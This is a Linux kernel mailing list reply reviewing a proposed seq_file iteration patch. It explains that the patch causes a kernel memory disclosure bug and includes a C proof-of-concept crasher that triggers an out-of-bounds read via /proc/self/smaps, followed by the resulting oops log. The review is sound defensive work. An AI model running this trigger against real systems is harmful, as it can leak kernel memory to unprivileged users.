Return-Path: <SRS0=3LFY=JX=vger.kernel.org=linux-kernel-owner@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-8.4 required=3.0 tests=DKIM_SIGNED,DKIM_VALID,
	DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,SPF_PASS,
	T_DKIMWL_WL_MED,URIBL_BLOCKED,USER_IN_DEF_DKIM_WL autolearn=ham
	autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 18413C3279B
	for <linux-kernel@archiver.kernel.org>; Sat,  7 Jul 2018 00:56:51 +0000 (UTC)
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by mail.kernel.org (Postfix) with ESMTP id A469022ACA
	for <linux-kernel@archiver.kernel.org>; Sat,  7 Jul 2018 00:56:50 +0000 (UTC)
Authentication-Results: mail.kernel.org;
	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.b="NQhSyNUj"
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org A469022ACA
Authentication-Results: mail.kernel.org; dmarc=fail (p=reject dis=none) header.from=google.com
Authentication-Results: mail.kernel.org; spf=none smtp.mailfrom=linux-kernel-owner@vger.kernel.org
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1754145AbeGGA4n (ORCPT
        <rfc822;linux-kernel@archiver.kernel.org>);
        Fri, 6 Jul 2018 20:56:43 -0400
Received: from mail-oi0-f66.google.com ([209.85.218.66]:36867 "EHLO
        mail-oi0-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1754086AbeGGA4j (ORCPT
        <rfc822;linux-kernel@vger.kernel.org>);
        Fri, 6 Jul 2018 20:56:39 -0400
Received: by mail-oi0-f66.google.com with SMTP id k81-v6so26607003oib.4
        for <linux-kernel@vger.kernel.org>; Fri, 06 Jul 2018 17:56:39 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
         :cc;
        bh=t+CdCzWyAXcKVqSMfIMRWN8UX+r5otInpD66Nos087I=;
        b=NQhSyNUjIsN8FvGGNHkOgEHpFofFYuSD+y8i6t2c840nYgQCuiX/TbVYZ/Sv/bdXxo
         0NXei/xSyJJN2MLe3OXLexgn684uoydqvCZjqyVh9bJgrntrIiMZvENUrb0631VnVKNG
         NZ0BdddSULw0gxmlME7tXnZp2pFlvzLAT+f+JWbTAd2xOof29Ec9SdZdNxwVdPBU2F0C
         A2kEqLXIanzN9SZSfmgeTQQq8rO7nFt56FJAg+80hQsyQGqNxFncWXgUM7y3dP6xqrSj
         yb0TIi21u/30yHUmR84LVra3Eu0uNRcQslfw+KL7XRZDCChAcCwHov50BMZkwuuC972a
         nt8A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to:cc;
        bh=t+CdCzWyAXcKVqSMfIMRWN8UX+r5otInpD66Nos087I=;
        b=BZKVa0LruU6Blo+YnIwSuLraO1tfBUUa2Oon3wYULdV6gH6PcNkdMG81AwaFwWwOuu
         T3gEXiQVz/agNadLdT1WXCgNLipxAmYJatlTi8IokvzOLBSwvelDff3t2unLiPgZbMT1
         nu9METTDPliqPswkNnxmF2c+O4XfBIjqGMwckKK8nCiYMYnKTm53L2nY3fTggCUJKWUJ
         40XEGjBw+0iVLR2HQdqRWSfMxm9eyqyU4dKHkBRXqqa6YTTh2aeH42gGfBnW5U31dvoH
         xtnmwCVG5lOWwW4VJyMWyzUgzwUM8iwfHqjOVGtEY8nXVer5gZKu4iBzNw8u1upcUlEz
         Zejg==
X-Gm-Message-State: APt69E28E6k3qC1nRrvqi9Lpq4agrAphRBkyYJ+8tOEZ9pIDgREbnfij
        YexYKaa5k6c3j+PZmGf4ColFhCf0Qhv7ns3/Zjb4wQ==
X-Google-Smtp-Source: AAOMgpeFSpUCVwWApZOZBcWz0njhswSN6WQjrIrLqQhr8tMQD93QdTcl1pq3+DL5R9d5kVx8wOhQ8t/ZC1sOeH9HHoI=
X-Received: by 2002:aca:c42:: with SMTP id i2-v6mr12460528oiy.219.1530924998856;
 Fri, 06 Jul 2018 17:56:38 -0700 (PDT)
MIME-Version: 1.0
References: <87vacsrt0r.fsf@notabene.neil.brown.name> <87fu3dihtf.fsf@notabene.neil.brown.name>
 <874lintqa6.fsf@notabene.neil.brown.name> <87y3fcegnn.fsf@notabene.neil.brown.name>
In-Reply-To: <87y3fcegnn.fsf@notabene.neil.brown.name>
From:   Jann Horn <jannh@google.com>
Date:   Sat, 7 Jul 2018 02:56:12 +0200
Message-ID: <CAG48ez2yTZMye0W3_5R04bV-Qyaz-=zSiVonw_zvRQNH6dcfeg@mail.gmail.com>
Subject: Re: [PATCH resend*3] VFS: simplify seq_file iteration code and interface
To:     neilb@suse.com, Andrew Morton <akpm@linux-foundation.org>,
        Al Viro <viro@zeniv.linux.org.uk>,
        Kees Cook <keescook@chromium.org>
Cc:     Linus Torvalds <torvalds@linux-foundation.org>,
        linux-doc@vger.kernel.org,
        kernel list <linux-kernel@vger.kernel.org>,
        linux-fsdevel@vger.kernel.org, Jonathan Corbet <corbet@lwn.net>
Content-Type: text/plain; charset="UTF-8"
Sender: linux-kernel-owner@vger.kernel.org
Precedence: bulk
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

On Sat, Jul 7, 2018 at 2:11 AM NeilBrown <neilb@suse.com> wrote:
>
>
> The documentation for seq_file suggests that it is necessary to be
> able to move the iterator to a given offset, however that is not the
> case.  If the iterator is stored in the private data and is stable
> from one read() syscall to the next, it is only necessary to support
> first/next interactions.  Implementing this in a client is a little
> clumsy.
> - if ->start() is given a pos of zero, it should go to start of
>   sequence.
> - if ->start() is given the name pos that was given to the most recent
>   next() or start(), it should restore the iterator to state just
>   before that last call
> - if ->start is given another number, it should set the iterator one
>   beyond the start just before the last ->start or ->next call.
>
>
> Also, the documentation says that the implementation can interpret the
> pos however it likes (other than zero meaning start), but seq_file
> increments the pos sometimes which does impose on the implementation.
>
> This patch simplifies the interface for first/next iteration and
> simplifies the code, while maintaining complete backward
> compatability.  Now:
>
> - if ->start() is given a pos of zero, it should return an iterator
>   placed at the start of the sequence
> - if ->start() is given a non-zero pos, it should return the iterator
>   in the same state it was after the last ->start or ->next.
>
> This is particularly useful for interators which walk the multiple
> chains in a hash table, e.g. using rhashtable_walk*. See
> fs/gfs2/glock.c and drivers/staging/lustre/lustre/llite/vvp_dev.c
>
> A large part of achieving this is to *always* call ->next after ->show
> has successfully stored all of an entry in the buffer.  Never just
> increment the index instead.
> Also:
>  - always pass &m->index to ->start() and ->next(), never a temp
>    variable
>  - don't clear ->from when ->count is zero, as ->from is dead when
>     ->count is zero.
>
>
> Some ->next functions do not increment *pos when they return NULL.
> To maintain compatability with this, we still need to increment
> m->index in one place, if ->next didn't increment it.
> Note that such ->next functions are buggy and should be fixed.
> A simple demonstration is
>    dd if=/proc/swaps bs=1000 skip=1
> Choose any block size larger than the size of /proc/swaps.
> This will always show the whole last line of /proc/swaps.
>
> This patch doesn't work around buggy next() functions for this case.
>
> Acked-by: Jonathan Corbet <corbet@lwn.net> (For the docs part)
> Signed-off-by: NeilBrown <neilb@suse.com>
> ---
>
> Still hoping someone might apply this, or at least review it,
> or maybe just tell me how insane it is - anything but silence :-(
>
> NeilBrown
[...]
> diff --git a/fs/seq_file.c b/fs/seq_file.c
> index 4cc090b50cc5..fd82585ab50f 100644
> --- a/fs/seq_file.c
> +++ b/fs/seq_file.c
[...]
> @@ -160,7 +154,6 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
>  {
>         struct seq_file *m = file->private_data;
>         size_t copied = 0;
> -       loff_t pos;
>         size_t n;
>         void *p;
>         int err = 0;
> @@ -223,16 +216,11 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
>                 size -= n;
>                 buf += n;
>                 copied += n;
> -               if (!m->count) {
> -                       m->from = 0;
> -                       m->index++;
> -               }
>                 if (!size)
>                         goto Done;
>         }
>         /* we need at least one record in buffer */
> -       pos = m->index;
> -       p = m->op->start(m, &pos);
> +       p = m->op->start(m, &m->index);
>         while (1) {
>                 err = PTR_ERR(p);
>                 if (!p || IS_ERR(p))
> @@ -243,8 +231,7 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
>                 if (unlikely(err))
>                         m->count = 0;
>                 if (unlikely(!m->count)) {
> -                       p = m->op->next(m, p, &pos);
> -                       m->index = pos;
> +                       p = m->op->next(m, p, &m->index);
>                         continue;
>                 }
>                 if (m->count < m->size)
> @@ -256,29 +243,33 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
>                 if (!m->buf)
>                         goto Enomem;
>                 m->version = 0;
> -               pos = m->index;
> -               p = m->op->start(m, &pos);
> +               p = m->op->start(m, &m->index);
>         }
>         m->op->stop(m, p);
>         m->count = 0;
>         goto Done;
>  Fill:
>         /* they want more? let's try to get some more */
> -       while (m->count < size) {
> +       while (1) {
>                 size_t offs = m->count;
> -               loff_t next = pos;
> -               p = m->op->next(m, p, &next);
> +               loff_t pos = m->index;
> +
> +               p = m->op->next(m, p, &m->index);
> +               if (pos == m->index)
> +                       /* Buggy ->next function */
> +                       m->index++;
>                 if (!p || IS_ERR(p)) {
>                         err = PTR_ERR(p);
>                         break;
>                 }
> +               if (m->count >= size)
> +                       break;
>                 err = m->op->show(m, p);
>                 if (seq_has_overflowed(m) || err) {
>                         m->count = offs;
>                         if (likely(err <= 0))
>                                 break;
>                 }
> -               pos = next;
>         }
>         m->op->stop(m, p);
>         n = min(m->count, size);
> @@ -287,11 +278,7 @@ ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
>                 goto Efault;
>         copied += n;
>         m->count -= n;
> -       if (m->count)
> -               m->from = n;
> -       else
> -               pos++;
> -       m->index = pos;
> +       m->from = n;

This patch introduces a kernel memory disclosure bug when something
like the following sequence of events happens (starting from a freshly
opened seq file):

1. read(seq_fd, buf, 2000): sets m->from=2000, m->count=100
2. create a buffer broken_buf which consists of 1000 bytes writable
memory followed by unmapped memory
3. read(seq_fd, broken_buf, 3100):
        - flushes buffered data to userspace, result: m->from=2100, m->count=0
        - accumulates new data, result: m->from=2100, m->count=3050
        - tries to copy new data to userspace, but fails ("goto Efault")
4. read(seq_fd, buf, 4096): does copy_to_user(buf, m->buf + m->from, n)

I wrote the following crasher to test this:

==================
#include <sys/mman.h>
#include <err.h>
#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

int main(void) {
  // dummy mappings: make sure /proc/self/smaps has lots to say
  for (int i=0; i<50; i++) {
    void *mapping = mmap(NULL, 0x2000, PROT_READ,
MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (mapping == MAP_FAILED)
      err(1, "mmap");
    if (mprotect(mapping, 0x1000, PROT_NONE))
      err(1, "mprotect");
  }

  int fd = open("/proc/self/smaps", O_RDONLY);
  if (fd == -1)
    err(1, "open");
  char buf[0x1000];

  // set m->from = 2000, m->count ~= 100
  int first_res = read(fd, buf, 2000);
  if (first_res != 2000)
    errx(1, "first res");

  // broken_buf: 1000 bytes writable memory followed by unmapped memory
  char *broken_buf_base = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  if (broken_buf_base == MAP_FAILED)
    err(1, "mmap");
  if (mprotect(broken_buf_base+0x1000, 0x1000, PROT_NONE))
    err(1, "mprotect");
  char *broken_buf = broken_buf_base+0x1000-1000;

  // set m->from = 2000, m->count ~= 3050
  int second_res = read(fd, broken_buf, 3100);
  printf("second read: %d\n", second_res);
  if (second_res <= 0 || second_res > 1000)
    errx(1, "second read didn't partly succeed as expected");

  // trigger OOB read
  read(fd, buf, 0x1000);
}
==================

Running this against a linux-next build with
CONFIG_HARDENED_USERCOPY=y, I reliably get kernel oopses that look as
follows:

==================
[  240.215442] usercopy: Kernel memory exposure attempt detected from
SLAB object 'kmalloc-4096' (offset 2663, size 2613)!
[  240.215475] ------------[ cut here ]------------
[  240.215478] kernel BUG at mm/usercopy.c:100!
[  240.215491] invalid opcode: 0000 [#1] SMP KASAN PTI
[  240.215500] CPU: 1 PID: 968 Comm: seq_read_trigge Not tainted
4.18.0-rc3-next-20180706 #37
[  240.215506] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.10.2-1 04/01/2014
[  240.215540] RIP: 0010:usercopy_abort+0x69/0x80
[  240.215544] Code: 44 d0 53 48 c7 c0 60 98 ae 92 51 48 c7 c6 e0 97
ae 92 41 53 48 89 f9 48 0f 45 f0 4c 89 d2 48 c7 c7 80 99 ae 92 e8 e0
2d dc ff <0f> 0b 49 c7 c1 20 97 ae 92 4d 89 cb 4d 89 c8 eb a5 66 0f 1f
44 00
[  240.215615] RSP: 0018:ffff8801d0a47bf8 EFLAGS: 00010286
[  240.215621] RAX: 000000000000006b RBX: 0000000000000a35 RCX: ffffffff911c883e
[  240.215627] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffff8801ec3261cc
[  240.215632] RBP: ffffea00079e2800 R08: ffffed003d864f29 R09: ffffed003d864f29
[  240.215637] R10: ffffffff92ae9820 R11: ffffed003d864f28 R12: 0000000000000a35
[  240.215643] R13: 0000000000000001 R14: ffff8801e78a1ddc R15: ffffea00079e2800
[  240.215649] FS:  00007f820d397700(0000) GS:ffff8801ec300000(0000)
knlGS:0000000000000000
[  240.215655] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  240.215660] CR2: 00007f820cf4f4c4 CR3: 00000001e7868003 CR4: 00000000001606e0
[  240.215668] Call Trace:
[  240.215680]  __check_heap_object+0xb3/0xc0
[  240.215691]  __check_object_size+0xdc/0x240
[  240.215702]  ? check_stack_object+0x21/0x60
[  240.215722]  seq_read+0x3d8/0x6a0
[  240.215740]  ? ldsem_up_read+0x13/0x40
[  240.215750]  __vfs_read+0xc4/0x370
[  240.215758]  ? __x64_sys_copy_file_range+0x2d0/0x2d0
[  240.215768]  ? vma_compute_subtree_gap+0x95/0xc0
[  240.215775]  ? vma_gap_callbacks_rotate+0x37/0x50
[  240.215785]  ? fsnotify+0x895/0x8e0
[  240.215794]  ? fsnotify+0x895/0x8e0
[  240.215806]  ? __fsnotify_inode_delete+0x20/0x20
[  240.215816]  vfs_read+0xa5/0x190
[  240.215823]  ksys_read+0xa1/0x120
[  240.215830]  ? kernel_write+0xa0/0xa0
[  240.215847]  ? mm_fault_error+0x1b0/0x1b0
[  240.215858]  do_syscall_64+0x73/0x160
[  240.215874]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  240.215881] RIP: 0033:0x7f820cecf700
[  240.215885] Code: b6 fe ff ff 48 8d 3d 87 be 08 00 48 83 ec 08 e8
06 db 01 00 66 0f 1f 44 00 00 83 3d 49 30 2c 00 00 75 10 b8 00 00 00
00 0f 05 <48> 3d 01 f0 ff ff 73 31 c3 48 83 ec 08 e8 de 9b 01 00 48 89
04 24
[  240.215955] RSP: 002b:00007ffffbcb56a8 EFLAGS: 00000246 ORIG_RAX:
0000000000000000
[  240.215962] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f820cecf700
[  240.215967] RDX: 0000000000001000 RSI: 00007ffffbcb56b0 RDI: 0000000000000003
[  240.215972] RBP: 00007ffffbcb66e0 R08: 0000000000000001 R09: 0000000000000011
[  240.215977] R10: 0000000000000064 R11: 0000000000000246 R12: 0000558430e72730
[  240.215982] R13: 00007ffffbcb67c0 R14: 0000000000000000 R15: 0000000000000000
[  240.215988] Modules linked in:
[  240.215996] ---[ end trace a76025513bde017a ]---
[  240.216004] RIP: 0010:usercopy_abort+0x69/0x80
[  240.216007] Code: 44 d0 53 48 c7 c0 60 98 ae 92 51 48 c7 c6 e0 97
ae 92 41 53 48 89 f9 48 0f 45 f0 4c 89 d2 48 c7 c7 80 99 ae 92 e8 e0
2d dc ff <0f> 0b 49 c7 c1 20 97 ae 92 4d 89 cb 4d 89 c8 eb a5 66 0f 1f
44 00
[  240.216076] RSP: 0018:ffff8801d0a47bf8 EFLAGS: 00010286
[  240.216082] RAX: 000000000000006b RBX: 0000000000000a35 RCX: ffffffff911c883e
[  240.216087] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffff8801ec3261cc
[  240.216092] RBP: ffffea00079e2800 R08: ffffed003d864f29 R09: ffffed003d864f29
[  240.216098] R10: ffffffff92ae9820 R11: ffffed003d864f28 R12: 0000000000000a35
[  240.216103] R13: 0000000000000001 R14: ffff8801e78a1ddc R15: ffffea00079e2800
[  240.216109] FS:  00007f820d397700(0000) GS:ffff8801ec300000(0000)
knlGS:0000000000000000
[  240.216114] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  240.216119] CR2: 00007f820cf4f4c4 CR3: 00000001e7868003 CR4: 00000000001606e0
==================

(I first started staring at this code because Kees pointed me to
https://syzkaller.appspot.com/bug?extid=4b712dce5cbce6700f27 , but I
think the case I found doesn't quite match what syzcaller is saying?)
